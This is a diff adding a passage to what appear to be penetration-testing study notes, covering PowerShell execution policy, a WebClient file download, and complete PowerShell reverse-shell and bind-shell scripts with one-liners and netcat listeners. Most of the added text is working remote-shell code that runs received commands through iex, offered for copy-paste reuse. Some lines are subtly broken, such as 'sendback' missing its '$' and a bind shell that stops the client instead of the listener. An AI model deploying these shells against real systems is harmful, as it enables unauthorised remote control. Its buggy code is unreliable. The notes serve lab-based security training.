@@ -185,3 +185,125 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 
 # 3 - POWERSHELL AND POWERCAT
++ Windows Powershell is a task-based command-line shell and scripting language
++ Powershell is administrative and powerful tool for penetration testing
++ Powershell have different pollicies for executing powershell scripts (the default is restricted)
++ To change the policy for this module we need to launch powershell as administrator and run this command
+
+```powershell
+Set-ExecutionPolicy Unrestricted
+# Press Y
+```
+
++ We can verify Execution policy changed with this command
+
+```powershell
+Get-ExecutionPolicy
+```
+
++ Powershell id powerful and responsive without needing to install extra tools on it.
+
+## 3.1 - POWERSHELL FILE TRANSFERS
++ Here we will transfer windows version of wget from Alice to Bob using powershell
++ On Bob's side we will execute this powershell command
+
+```powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'C:\Users\username\Desktop\wget.exe')"
+# -c indicates the command being executed by powershell 
+# new-object is for instantiating a .NET framework or a COM object
+# Here it is a web-client class which is defined and implemented ins system .NET namespace
+# downloadFile is the public method od web-client object 
+# It has two arguments first one is the url and the second one is the output path to write to file
+```
+
+## 3.2 -  POWERSHELL REVERSE SHELLS
++ In this section we will leverage powershell's one-liner to execute shells beginning with a reverse shell
++ First setup a netcat listener on Alice's Linux machine
+
+```bash
+nc -lvnp 10001
+```
+
++ Next we will execute this powershell script on Bob's Windows machine
++ It includes several powershell commands separated by semicolons `;`
+
+```powershell
+# Assign IP address and port to client socket variable
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4', 10001);
+
+# stream variable Get network stream class to facilitate sending and receiving data
+$stream = $client.GetStream();
+
+# bytes variable as our buffer
+[byte[]]$bytes = 0..65535|%{0};
+
+# while loop for several lines for reading and writing data from network streams
+while (($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+	
+	# iex runs any command given as input
+	$sendback = (iex $data 2>&1 | Out-String);
+	$sendback2 = sendback + 'PS ' + (pwd).Path + '> ';
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	
+	# Writes output of iex into data stream through network connection
+	$stream.Write($sendbyte, 0, $sendbyte.Length);
+	$stream.Flush();
+}
+
+# Close client connections
+$client.Close();
+```
+
++ We can use these command in one-liner poweshell command
+
+```powershell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4', 10001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while (($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();"
+```
++ No need to memorize this command, we can copy and paste this
++ By replacing IP and port number we can reuese this powershell reverse shell command
+
+## 3.3 - POWERSHELL BIND SHELLS
++ The process of getting shell i previous scenario is reversed when dealing with bind shells
++ We first create the bind shell with `powershell` in Bob's Windows machine and the connects to it with `netcat` from Alice's Linux machine
++ We will execute this powershell code in Bob's windows machine to create a bind shell
+
+```powershell
+# Start a socket TCP listener using System.Net.Sockets.TcpListener class
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 443);
+
+$listener.start();
+$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+
+	# iex runs any command given as input
+	$sendback = (iex $data 2>&1 | Out-String);
+	$sendback2 = sendback + 'PS ' + (pwd).Path + '> ';
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	
+	# Writes output of iex into data stream through network connection
+	$stream.Write($sendbyte, 0, $sendbyte.Length);
+	$stream.Flush();
+}
+
+$client.Close();
+$client.Stop();
+```
+
++ We sill execute above script as a one-liner powershell command like this on Bob's Windows machine:
+
+```powershell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();$client.Stop();"
+```
+
++ Then we will connect to it with netcat from Alice's Linux machine like this:
+
+```bash
+nc -nv 10.11.0.22 443
+```
+
++ Due to Administrative capabalities of powershell, Knowing how to use it in penetration test is extremenly important
